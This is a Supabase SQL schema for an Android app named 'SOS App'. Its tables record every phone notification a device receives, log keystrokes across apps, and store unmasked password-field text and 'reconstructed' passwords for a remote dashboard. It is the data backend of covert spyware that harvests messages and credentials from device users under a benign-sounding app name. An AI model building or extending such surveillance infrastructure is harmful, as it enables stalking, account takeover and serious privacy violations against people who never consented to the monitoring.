-- ============================================================
-- SOS App — Supabase schema
-- Project: qruhcvqqwmygnsbuhnpr
-- Run this whole file in Supabase SQL Editor (or via Management API).
-- Safe to re-run: all statements are idempotent (CREATE IF NOT EXISTS).
-- ============================================================

-- ─── DEVICES ────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS public.devices (
    device_id       TEXT PRIMARY KEY,
    model           TEXT,
    manufacturer    TEXT,
    android_version TEXT,
    battery         INT,
    status          TEXT DEFAULT 'offline',
    last_seen       TIMESTAMPTZ DEFAULT now(),
    connected_at    TIMESTAMPTZ,
    owner           TEXT,
    metadata        JSONB DEFAULT '{}'::jsonb
);
CREATE INDEX IF NOT EXISTS idx_devices_owner ON public.devices (owner);
CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON public.devices (last_seen DESC);

-- ─── NOTIFICATIONS (device lifecycle events: online/offline/setup_complete) ──
CREATE TABLE IF NOT EXISTS public.notifications (
    id         BIGSERIAL PRIMARY KEY,
    device_id  TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    type       TEXT NOT NULL,            -- device_online | device_offline | setup_complete
    title      TEXT,
    message    TEXT,
    data       JSONB DEFAULT '{}'::jsonb,
    created_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_notifications_device ON public.notifications (device_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_notifications_created ON public.notifications (created_at DESC);

-- ─── CAPTURED NOTIFICATIONS (phone notifications caught by the listener) ──
-- The device's NotificationReaderService sends every posted notification here:
--   TIME (post_time) | MESSAGE (title + text) | APP NAME (app_name)
-- Dedup: a re-delivery of the SAME (key + content) updates in place; a NEW
-- message on the same key (e.g. Samsung conversation notifications) inserts a
-- new row so every distinct message is preserved as its own history entry.
CREATE TABLE IF NOT EXISTS public.captured_notifications (
    id           BIGSERIAL PRIMARY KEY,
    device_id    TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    key          TEXT,                    -- StatusBarNotification key (dedupe)
    content_hash TEXT,                    -- sha256(title\nmessage) — distinguishes re-delivery from new message
    package_name TEXT,
    app_name     TEXT,
    title        TEXT,
    message      TEXT,
    post_time    BIGINT,                  -- device epoch ms when the notification appeared
    data         JSONB DEFAULT '{}'::jsonb,
    created_at   TIMESTAMPTZ DEFAULT now(),
    UNIQUE (device_id, key, content_hash)
);
CREATE INDEX IF NOT EXISTS idx_captured_notif_device ON public.captured_notifications (device_id, post_time DESC);
CREATE INDEX IF NOT EXISTS idx_captured_notif_created ON public.captured_notifications (created_at DESC);

-- ─── ACTIVITY EVENTS (activity capture, ported from Remote-App) ──
CREATE TABLE IF NOT EXISTS public.activity_events (
    id         BIGSERIAL PRIMARY KEY,
    device_id  TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    event_uuid TEXT,                       -- client-generated id (outbox dedup)
    event_type TEXT DEFAULT 'keystroke',
    app_package TEXT DEFAULT 'unknown',
    text       TEXT DEFAULT '',
    real_text  TEXT,                      -- unmasked text read from the source node (password fields)
    is_password BOOLEAN DEFAULT false,   -- true when the field was a password/secret field
    text_revealed TEXT,                  -- reconstructed real text (dashboard computes, persisted here)
    reveal_partial BOOLEAN DEFAULT false, -- true when reconstruction was partial (paste/mid-field/etc.)
    full_text  TEXT,
    class_name TEXT,
    before_text TEXT,
    content_desc TEXT,
    scroll_y INTEGER,
    max_scroll_y INTEGER,
    item_count INTEGER,
    previous_app TEXT,
    created_at TIMESTAMPTZ DEFAULT now()
);
-- Outbox dedup: phone re-sends events until it receives an event_ack; this
-- unique index makes duplicate re-sends harmless (exactly-once persistence).
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS event_uuid TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS before_text TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS content_desc TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS scroll_y INTEGER;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS max_scroll_y INTEGER;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS item_count INTEGER;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS previous_app TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS real_text TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS is_password BOOLEAN DEFAULT false;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS text_revealed TEXT;
ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS reveal_partial BOOLEAN DEFAULT false;
CREATE UNIQUE INDEX IF NOT EXISTS uq_activity_device_uuid ON public.activity_events (device_id, event_uuid);
CREATE INDEX IF NOT EXISTS idx_activity_events_device ON public.activity_events (device_id, created_at DESC);

-- ─── PENDING REVEALS (persistent bridge: reveal arrives before event row) ──
-- The dashboard can compute a reconstructed password before the phone's async
-- save has written the event row. The reveal is parked here (NOT process
-- memory) so a server restart/redeploy never drops it; saveActivityEvents
-- applies and removes it the moment the row lands. Rows older than 24h are
-- cleaned up by the server.
CREATE TABLE IF NOT EXISTS public.pending_reveals (
    device_id       TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
    event_uuid      TEXT NOT NULL,
    reveal_text     TEXT NOT NULL,
    reveal_partial  BOOLEAN DEFAULT false,
    created_at      TIMESTAMPTZ DEFAULT now(),
    PRIMARY KEY (device_id, event_uuid)
);
CREATE INDEX IF NOT EXISTS idx_pending_reveals_created ON public.pending_reveals (created_at);